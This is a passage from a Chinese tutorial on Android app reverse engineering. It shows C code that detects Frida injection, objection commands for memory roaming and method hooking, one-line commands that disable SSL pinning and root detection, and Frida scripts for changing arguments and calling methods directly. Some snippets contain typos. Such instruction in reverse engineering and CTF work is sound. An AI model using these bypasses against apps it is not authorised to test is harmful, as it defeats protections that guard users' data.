&#123;  <br>        <span class="hljs-comment">// 如果文件成功打开，循环读取每一行  </span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fgets</span>(line, <span class="hljs-built_in">sizeof</span>(line), fp)) &#123;  <br>            <span class="hljs-comment">// 使用自定义strstr函数检查当前行是否包含&quot;frida&quot;指纹  </span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">my_strstr</span>(line, <span class="hljs-string">&quot;frida&quot;</span>) || <span class="hljs-built_in">my_strstr</span>(line, <span class="hljs-string">&quot;gadget&quot;</span>)) &#123;  <br>                <span class="hljs-comment">// 如果找到了，关闭文件并返回true，表示检测到了恶意库  </span><br>                <span class="hljs-built_in">fclose</span>(fp);  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>            &#125;  <br>        &#125;  <br>        <span class="hljs-comment">// 遍历完文件后，关闭文件  </span><br>        <span class="hljs-built_in">fclose</span>(fp);  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-comment">// 如果无法打开文件，记录错误。这可能意味着系统状态异常  </span><br>        <span class="hljs-comment">// 注意：这里的代码没有处理错误，只是注释说明了可能的情况  </span><br>    &#125;  <br>    <span class="hljs-comment">// 如果没有在内存映射文件中找到&quot;frida&quot;，返回false，表示没有检测到恶意库  </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>&#125;  <br>  <br><span class="hljs-comment">//自实现了libc里的几个系统函数  </span><br>__attribute__((always_inline))  <br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">char</span> *  </span><br><span class="hljs-function"><span class="hljs-title">my_strstr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *find)</span>  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-type">char</span> c, sc;  <br>    <span class="hljs-type">size_t</span> len;  <br>  <br>    <span class="hljs-keyword">if</span> ((c = *find++) != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;  <br>        len = <span class="hljs-built_in">my_strlen</span>(find);  <br>        <span class="hljs-keyword">do</span> &#123;  <br>            <span class="hljs-keyword">do</span> &#123;  <br>                <span class="hljs-keyword">if</span> ((sc = *s++) == <span class="hljs-string">&#x27;\0&#x27;</span>)  <br>                    <span class="hljs-keyword">return</span> (<span class="hljs-literal">NULL</span>);  <br>            &#125; <span class="hljs-keyword">while</span> (sc != c);  <br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">my_strncmp</span>(s, find, len) != <span class="hljs-number">0</span>);  <br>        s--;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> ((<span class="hljs-type">char</span> *)s);  <br>&#125;  <br>  <br></code></pre></td></tr></table></figure><h5 id="objection"><a href="#objection" class="headerlink" title="objection"></a>objection</h5><hr><p>objection是基于frida的命令行hook集合工具, 可以让你不写代码, 敲几句命令就可以对java函数的高颗粒度hook, 还支持RPC调用。可以实现诸如内存搜索、类和模块搜索、方法hook打印参数返回值调用栈等常用功能，是一个非常方便的，逆向必备、内存漫游神器。</p><p>注入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">objection -g 包名 explore<br><br>-   <span class="hljs-built_in">help</span>：不知道当前命令的效果是什么，在当前命令前加<span class="hljs-built_in">help</span>比如:<span class="hljs-built_in">help</span> <span class="hljs-built_in">env</span>，回车之后会出现当前命令的解释信息<br>-   按空格：不知道输入什么就按空格，会有提示出来<br>-   <span class="hljs-built_in">jobs</span>：可以进行多项hook<br>-   日志：objection的日志文件生成在 C:\Users\Administrator\.objection<br></code></pre></td></tr></table></figure><p>启动前就hook</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">objection -<span class="hljs-selector-tag">g</span> 进程名 explore <span class="hljs-attr">--startup-command</span> <span class="hljs-string">&quot;android hooking watch class 路径.类名&quot;</span><br></code></pre></td></tr></table></figure><p>objection基础api</p><ul><li>memory list modules -查看内存中加载的库</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">memory <span class="hljs-keyword">list</span> modules<br>Save the output by adding `--json modules.json` <span class="hljs-keyword">to</span> this <span class="hljs-keyword">command</span><br>Name                                                              Base          Size                 Path<br>----------------------------------------------------------------  ------------  -------------------  ------------------------------------------------------------------------------<br>app_process64                                                     <span class="hljs-number">0</span>x57867c9000  <span class="hljs-number">40960</span> (<span class="hljs-number">40.0</span> KiB)     /<span class="hljs-built_in">system</span>/bin/app_process64<br>linker64                                                          <span class="hljs-number">0</span>x72e326a000  <span class="hljs-number">229376</span> (<span class="hljs-number">224.0</span> KiB)   /<span class="hljs-built_in">system</span>/bin/linker64<br>libandroid_runtime.<span class="hljs-keyword">so</span>                                             <span class="hljs-number">0</span>x72e164e000  <span class="hljs-number">2113536</span> (<span class="hljs-number">2.0</span> MiB)    /<span class="hljs-built_in">system</span>/lib64/libandroid_runtime.<span class="hljs-keyword">so</span><br>libbase.<span class="hljs-keyword">so</span>                                                        <span class="hljs-number">0</span>x72dfa67000  <span class="hljs-number">81920</span> (<span class="hljs-number">80.0</span> KiB)     /<span class="hljs-built_in">system</span>/lib64/libbase.<span class="hljs-keyword">so</span><br>libbinder.<span class="hljs-keyword">so</span>                                                      <span class="hljs-number">0</span>x72dec1c000  <span class="hljs-number">643072</span> (<span class="hljs-number">628.0</span> KiB)   /<span class="hljs-built_in">system</span>/lib64/libbinder.<span class="hljs-keyword">so</span><br>libcutils.<span class="hljs-keyword">so</span>                                                      <span class="hljs-number">0</span>x72de269000  <span class="hljs-number">86016</span> (<span class="hljs-number">84.0</span> KiB)     /<span class="hljs-built_in">system</span>/lib64/libcutils.<span class="hljs-keyword">so</span><br>libhidlbase.<span class="hljs-keyword">so</span>                                                    <span class="hljs-number">0</span>x72df4cc000  <span class="hljs-number">692224</span> (<span class="hljs-number">676.0</span> KiB)   /<span class="hljs-built_in">system</span>/lib64/libhidlbase.<span class="hljs-keyword">so</span><br>liblog.<span class="hljs-keyword">so</span>                                                         <span class="hljs-number">0</span>x72e0be1000  <span class="hljs-number">98304</span> (<span class="hljs-number">96.0</span> KiB)     /<span class="hljs-built_in">system</span>/lib64/liblog<br></code></pre></td></tr></table></figure><ul><li>memory list exports so名称 - 查看库的导出函数</li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ada">memory list exports liblog.so<br>Save the output by adding `<span class="hljs-comment">--json exports.json` to this command</span><br><span class="hljs-keyword">Type</span>      <span class="hljs-type">Name                                  </span>Address<br><span class="hljs-comment">--------  ------------------------------------  ------------</span><br><span class="hljs-keyword">function</span>  <span class="hljs-title">android_log_write_int32</span>               0x72e0be77c8<br><span class="hljs-keyword">function</span>  <span class="hljs-title">android_log_write_list_begin</span>          0x72e0be76f0<br><span class="hljs-keyword">function</span>  <span class="hljs-title">__android_log_bswrite</span>                 0x72e0be9bd8<br><span class="hljs-keyword">function</span>  <span class="hljs-title">__android_log_security</span>                0x72e0bf2144<br><span class="hljs-keyword">function</span>  <span class="hljs-title">__android_log_bwrite</span>                  0x72e0be9a18<br><span class="hljs-keyword">function</span>  <span class="hljs-title">android_log_reset</span>                     0x72e0be75ec<br><span class="hljs-keyword">function</span>  <span class="hljs-title">android_log_write_string8</span>             0x72e0be7a38<br><span class="hljs-keyword">function</span>  <span class="hljs-title">android_logger_list_free</span>              0x72e0be8c04<br><span class="hljs-keyword">function</span>  <span class="hljs-title">__android_log_print</span>                   0x72e0be9728<br><span class="hljs-keyword">function</span>  <span class="hljs-title">__android_logger_property_get_bool</span>    0x72e0bf2248<br><span class="hljs-keyword">function</span>  <span class="hljs-title">android_logger_get_id</span>                 0x72e0be8270<br><span class="hljs-keyword">function</span>  <span class="hljs-title">android_logger_set_prune_list</span>         0x72e0be8948<br></code></pre></td></tr></table></figure><ul><li>android hooking list activities -查看内存中加载的activity &#x2F;android hooking list services -查看内存中加载的services</li></ul><p><img src="image-20240719150546826.png" alt="image-20240719150546826"></p><ul><li><p>android intent launch_activity 类名 -启动activity或service(可以用于一些没有验证的activity,在一些简单的ctf中有时候可以出奇效)</p></li><li><p>关闭ssl校验  android sslpinning disable</p></li><li><p>关闭root检测  android root disable</p></li></ul><p><strong>objection内存漫游</strong></p><ul><li>内存搜刮类实例</li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs smali">android heap search instances 类名(命令)<br>Class<span class="hljs-built_in"> instance </span>enumeration complete for com.zj.wuaipojie.Demo  <br> Hashcode  Class                  toString()<br>---------  ---------------------  -----------------------------<br>215120583  com.zj.wuaipojie.Demo  com.zj.wuaipojie.Demo@cd27ac7<br></code></pre></td></tr></table></figure><ul><li>调用实例的方法</li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs smali">android heap<span class="hljs-built_in"> execute </span>&lt;handle&gt; getPublicInt(实例的hashcode+方法名)<br>如果是带参数的方法，则需要进入编辑器环境  <br>android heap evaluate &lt;handle&gt;  <br>console.log(clazz.a(<span class="hljs-string">&quot;吾爱破解&quot;</span>));<br>按住esc+enter触发<br></code></pre></td></tr></table></figure><ul><li>android hooking list classes -列出内存中所有的类(结果比静态分析的更准确)</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">android hooking list classes <br><br>tw<span class="hljs-selector-class">.idv</span><span class="hljs-selector-class">.palatis</span><span class="hljs-selector-class">.xappdebug</span><span class="hljs-selector-class">.MainApplication</span><br>tw<span class="hljs-selector-class">.idv</span><span class="hljs-selector-class">.palatis</span><span class="hljs-selector-class">.xappdebug</span><span class="hljs-selector-class">.xposed</span><span class="hljs-selector-class">.HookMain</span><br>tw<span class="hljs-selector-class">.idv</span><span class="hljs-selector-class">.palatis</span><span class="hljs-selector-class">.xappdebug</span><span class="hljs-selector-class">.xposed</span>.HookMain<span class="hljs-variable">$a</span><br>tw<span class="hljs-selector-class">.idv</span><span class="hljs-selector-class">.palatis</span><span class="hljs-selector-class">.xappdebug</span><span class="hljs-selector-class">.xposed</span>.HookMain<span class="hljs-variable">$b</span><br>tw<span class="hljs-selector-class">.idv</span><span class="hljs-selector-class">.palatis</span><span class="hljs-selector-class">.xappdebug</span><span class="hljs-selector-class">.xposed</span>.HookMain<span class="hljs-variable">$c</span><br>tw<span class="hljs-selector-class">.idv</span><span class="hljs-selector-class">.palatis</span><span class="hljs-selector-class">.xappdebug</span><span class="hljs-selector-class">.xposed</span>.HookMain<span class="hljs-variable">$d</span><br>tw<span class="hljs-selector-class">.idv</span><span class="hljs-selector-class">.palatis</span><span class="hljs-selector-class">.xappdebug</span><span class="hljs-selector-class">.xposed</span><span class="hljs-selector-class">.HookSelf</span><br>u<br>v<br>void<br>w<br>xposed<span class="hljs-selector-class">.dummy</span><span class="hljs-selector-class">.XResourcesSuperClass</span><br>xposed<span class="hljs-selector-class">.dummy</span><span class="hljs-selector-class">.XTypedArraySuperClass</span><br><br>Found <span class="hljs-number">10798</span> classes<br></code></pre></td></tr></table></figure><ul><li>android hooking search classes 关键类名 -在内存中所有已加载的类中搜索包含特定关键词的类</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">android hooking search classes wuaipojie<br>Note that Java classes are only loaded when they are used, so <span class="hljs-keyword">if</span> the expected class has not been found, it might not have been loaded yet.<br>com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.Demo</span><br>com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span>.Demo<span class="hljs-variable">$Animal</span><br>com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span>.Demo<span class="hljs-variable">$Companion</span><br>com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span>.Demo<span class="hljs-variable">$InnerClass</span><br>com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span>.Demo<span class="hljs-variable">$test</span>$<span class="hljs-number">1</span><br>com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.MainApplication</span><br>com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.databinding</span><span class="hljs-selector-class">.ActivityMainBinding</span><br>... <br><br>Found <span class="hljs-number">38</span> classes<br></code></pre></td></tr></table></figure><ul><li><p>android hooking search methods 关键方法名 -在内存中所有已加载的类的方法中搜索包含特定关键词的方法(一般不建议使用，特别耗时，还可能崩溃)</p></li><li><p>android hooking list class_methods 类名 -内存漫游类中的所有方法</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">android hooking list class_methods com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span><br>private static final void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>.onCreate<span class="hljs-variable">$lambda</span><span class="hljs-built_in">-0</span>(com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>,android<span class="hljs-selector-class">.view</span>.View)<br>private static final void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>.onCreate<span class="hljs-variable">$lambda</span><span class="hljs-built_in">-1</span>(com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>,android<span class="hljs-selector-class">.view</span>.View)<br>private static final void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>.onCreate<span class="hljs-variable">$lambda</span><span class="hljs-built_in">-2</span>(com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>,android<span class="hljs-selector-class">.view</span>.View)<br>private static final void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>.onCreate<span class="hljs-variable">$lambda</span><span class="hljs-built_in">-3</span>(com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>,android<span class="hljs-selector-class">.view</span>.View)<br>protected void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span><span class="hljs-selector-class">.onCreate</span>(android<span class="hljs-selector-class">.os</span>.Bundle)<br>public final java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span> com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span><span class="hljs-selector-class">.hexToString</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>public final java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span> com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span><span class="hljs-selector-class">.unicodeToString</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>public final void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span><span class="hljs-selector-class">.toastPrint</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>public static void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>.<span class="hljs-variable">$r8</span><span class="hljs-variable">$lambda</span>$<span class="hljs-number">1</span><span class="hljs-built_in">lrkrgiCEFWXZDHzLRibYURG1h8</span>(com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>,android<span class="hljs-selector-class">.view</span>.View)<br>public static void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>.<span class="hljs-variable">$r8</span><span class="hljs-variable">$lambda</span><span class="hljs-variable">$IUqwMqbTKaOGiTaeOmvy_GjNBso</span>(com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>,android<span class="hljs-selector-class">.view</span>.View)<br>public static void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>.<span class="hljs-variable">$r8</span><span class="hljs-variable">$lambda</span><span class="hljs-variable">$Kc_cRYZjjhjsTl6GYNHbgD</span><span class="hljs-built_in">-i6sE</span>(com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>,android<span class="hljs-selector-class">.view</span>.View)<br>public static void com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>.<span class="hljs-variable">$r8</span><span class="hljs-variable">$lambda</span><span class="hljs-variable">$PDKm2AfziZQo6Lv1HEFkJWkUsoE</span>(com<span class="hljs-selector-class">.zj</span><span class="hljs-selector-class">.wuaipojie</span><span class="hljs-selector-class">.ui</span><span class="hljs-selector-class">.ChallengeSixth</span>,android<span class="hljs-selector-class">.view</span>.View)<br><br>Found <span class="hljs-number">12</span> <span class="hljs-built_in">method</span>(s)<br></code></pre></td></tr></table></figure><p><strong>objectionHook</strong></p><ul><li>hook类的所有方法</li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">android hooking watch <span class="hljs-keyword">class</span> 类名<br></code></pre></td></tr></table></figure><ul><li>hook方法的参数、返回值和调用栈</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">android hooking watch class_method 类名.方法名 --<span class="hljs-keyword">dump</span>-args --<span class="hljs-keyword">dump</span>-<span class="hljs-keyword">return</span> --<span class="hljs-keyword">dump</span>-backtrace<br></code></pre></td></tr></table></figure><ul><li>hook 类的构造方法</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">android</span> hooking watch class_method 类名.<span class="hljs-variable">$init</span><br></code></pre></td></tr></table></figure><ul><li>hook 方法的所有重载</li></ul><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">android hooking watch <span class="hljs-keyword">class</span><span class="hljs-number">_m</span>ethod 类名.方法名<br></code></pre></td></tr></table></figure><h5 id="修改参数的change-args-函数"><a href="#修改参数的change-args-函数" class="headerlink" title="修改参数的change_args()函数"></a>修改参数的change_args()函数</h5><hr><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> change_args&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Script loaded successfully&quot;</span>)<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Inside java perform function&quot;</span>)<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;com.roysue.demo02.MainActivity&#x27;</span>)<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Java.Use.Successfully!&quot;</span>)<br>        <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">fun</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">x,y</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;orignal args: x=&gt; &quot;</span>,x,<span class="hljs-string">&quot;, y =&gt;  &quot;</span>,y)<br>            <span class="hljs-keyword">var</span> ret_value = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fun</span>(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>            <span class="hljs-keyword">return</span> ret_value<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="setImmediate（Frida的API函数）"><a href="#setImmediate（Frida的API函数）" class="headerlink" title="setImmediate（Frida的API函数）"></a>setImmediate（Frida的API函数）</h5><p>函数传递的参数是要被执行 的函数，比如传入main参数，表示当Frida注入App后立即执行 main()函数。这个函数和setTimeout()函数类似，都是用于指定要执 行的函数，不同的是setTimeout可以用于指定Frida注入App多长时 间后执行函数，往往用于延时注入。</p><h5 id="Java层主动调用"><a href="#Java层主动调用" class="headerlink" title="Java层主动调用"></a>Java层主动调用</h5><p>主动调用就是强制调用一个函数去执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">secret</span><span class="hljs-params">()</span>&#123;<br>    Log.d(<span class="hljs-string">&quot;r0ysue.secret&quot;</span> , <span class="hljs-string">&quot;this is secret func&quot;</span>);<br>&#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">staticSecret</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//加了static修饰词</span><br>  Log.d(<span class="hljs-string">&quot;r0ysue.secret&quot;</span> , <span class="hljs-string">&quot;this is static secretic secrtic func&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据这个特殊性，hook的方式也不一样</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Script loaded successfully &quot;</span>)<br>     <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-params"><span class="hljs-keyword">function</span></span>)&#123;<br>         <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Inside java perform function&quot;</span>)<br>         <br>         <span class="hljs-comment">//静态函数主动调用,static修饰</span><br>         <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivicy</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;com.roysue.demo02.MainActivity&#x27;</span>)  <span class="hljs-comment">//lei&#x27;mi</span><br>         <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">staticSecret</span>()  <span class="hljs-comment">//调用MainActivity类的静态方法staticSecret()。</span><br>         <br>         <span class="hljs-comment">//动态函数主动调用</span><br>         <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;com.roysue.demo02,MainActivity&#x27;</span>,&#123;<br>              <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>)&#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;instance found&#x27;</span>,instance)<br>                    instance.<span class="hljs-title function_">secret</span>() <span class="hljs-comment">//调用实例的secret()方法。</span><br>              &#125;.<br>              <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>                 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;search Complete&#x27;</span>)<br>              &#125;<br>         &#125;)<br>     &#125;)<br>&#125; <br><span class="hljs-title function_">setImmediate</span>(mian)<br></code></pre></td></tr></table></figure><h5 id="RPC及其自动化"><a href="#RPC及其自动化" class="headerlink" title="RPC及其自动化"></a>RPC及其自动化</h5><p>加了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> “hello”<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">secret</span><span class="hljs-params">()</span> &#123;<br>    total += <span class="hljs-string">&quot; secreFunc&quot;</span>;<br>    Log.d(<span class="hljs-string">&quot;r0ysue.secret&quot;</span>,<span class="hljs-string">&quot;this is secret func&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>获取total这个实例变量的值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> 